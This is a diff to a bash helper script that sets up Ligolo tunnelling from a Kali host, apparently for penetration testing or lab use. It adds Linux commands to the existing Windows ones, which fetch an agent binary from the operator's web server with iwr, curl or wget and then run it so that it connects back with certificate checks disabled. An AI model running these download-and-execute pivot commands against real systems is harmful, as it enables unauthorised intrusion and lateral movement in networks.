@@ -446,13 +446,22 @@ fi
 # =========================
 # TARGET COMMAND
 # =========================
-CMD1="iwr http://$IP:$WEBPORT/agent.exe -OutFile agent.exe"
-CMD2="Start-Process .\\agent.exe -ArgumentList '-connect $IP:$PORT -ignore-cert'"
+CMD1_WIN="iwr http://$IP:$WEBPORT/agent.exe -OutFile agent.exe"
+CMD2_WIN="Start-Process .\\agent.exe -ArgumentList '-connect $IP:$PORT -ignore-cert'"
 
-echo "[+] Run on target:"
+CMD1_LNX="curl -sO http://$IP:$WEBPORT/agent || wget http://$IP:$WEBPORT/agent"
+CMD2_LNX="chmod +x agent && ./agent -connect $IP:$PORT -ignore-cert &"
+
+echo "[+] Run on target (Windows):"
 echo "--------------------------------"
-echo "$CMD1"
-echo "$CMD2"
+echo "$CMD1_WIN"
+echo "$CMD2_WIN"
+echo "--------------------------------"
+
+echo "[+] Run on target (Linux):"
+echo "--------------------------------"
+echo "$CMD1_LNX"
+echo "$CMD2_LNX"
 echo "--------------------------------"
 
 echo "[+] Run on kali ligolo after agent joined:"
@@ -468,6 +477,7 @@ echo ""
 echo "[*] Starting Ligolo..."
 cd "$LIGOLO_DIR" || exit
 ./proxy -selfcert
+                 
                  
 ```
 
